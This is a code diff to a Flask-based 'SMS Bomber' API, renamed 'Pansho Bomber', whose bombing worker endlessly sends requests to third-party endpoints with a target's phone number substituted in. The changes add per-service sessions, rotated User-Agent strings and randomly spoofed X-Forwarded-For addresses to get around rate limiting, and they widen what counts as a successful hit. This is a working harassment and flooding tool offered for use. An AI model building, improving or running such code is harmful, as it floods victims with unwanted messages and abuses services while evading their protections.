@@ -13,7 +13,7 @@ CORS(app)
 
 # ===== DATA FILES =====
 REQUESTS_FILE = 'requests/requests.json'
-STATS_FILE = 'requests/stats.json'  # Stats in requests folder
+STATS_FILE = 'requests/stats.json'
 
 # ===== LOAD DATA =====
 def load_requests():
@@ -49,7 +49,7 @@ bombing_lock = threading.Lock()
 @app.route('/')
 @app.route('/api/health')
 def health():
-    return jsonify({"status": "ok", "message": "SMS Bomber API is live!"})
+    return jsonify({"status": "ok", "message": "Pansho Bomber API is live!"})
 
 @app.route('/api/requests', methods=['GET'])
 def get_requests():
@@ -111,7 +111,7 @@ def bombing_status():
         "active_requests": sum(1 for r in requests_data if r.get('active', True))
     })
 
-# ===== BOMBING ENGINE =====
+# ===== BOMBING ENGINE (Pansho Style) =====
 def bombing_worker(phone):
     global bombing_active, stats_data
     active_requests = [r for r in requests_data if r.get('active', True)]
@@ -120,36 +120,50 @@ def bombing_worker(phone):
         bombing_active = False
         return
     
+    # Store session data per request
+    sessions = {}
+    
     while bombing_active:
         for req in active_requests:
             if not bombing_active:
                 break
             
+            # Get or create session for this request
+            if req['name'] not in sessions:
+                sessions[req['name']] = {
+                    'session': req_lib.Session(),
+                    'cookies': {},
+                    'token': None
+                }
+            
+            session_data = sessions[req['name']]
+            
+            # Phone variations
             phone_variants = req.get('phones', [phone])
             target_phone = random.choice(phone_variants) if phone_variants else phone
             
+            # Build request
             url = req['url'].replace('{phone}', target_phone)
             headers = req['headers'].copy()
             headers['User-Agent'] = random.choice([
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
             ])
             headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
             
             try:
                 if req['method'] == 'POST':
                     if isinstance(req['body'], dict):
-                        r = req_lib.post(url, headers=headers, json=req['body'], timeout=5)
+                        r = session_data['session'].post(url, headers=headers, json=req['body'], timeout=5)
                     else:
                         body = req['body'].replace('{phone}', target_phone)
-                        r = req_lib.post(url, headers=headers, data=body, timeout=5)
+                        r = session_data['session'].post(url, headers=headers, data=body, timeout=5)
                 else:
-                    r = req_lib.get(url, headers=headers, timeout=5)
+                    r = session_data['session'].get(url, headers=headers, timeout=5)
                 
                 with bombing_lock:
                     stats_data['total_requests'] += 1
-                    if r.status_code == 200:
+                    if r.status_code in [200, 302, 201, 202]:
                         stats_data['success'] += 1
                     elif r.status_code == 429:
                         stats_data['rate_limited'] += 1
@@ -173,7 +187,7 @@ def bombing_worker(phone):
 def serve_admin():
     return send_from_directory('../admin', 'index.html')
 
-# ===== VERCEL ENTRY POINT =====
+# ===== VERCEL ENTRY =====
 app.debug = False
 
 if __name__ == '__main__':
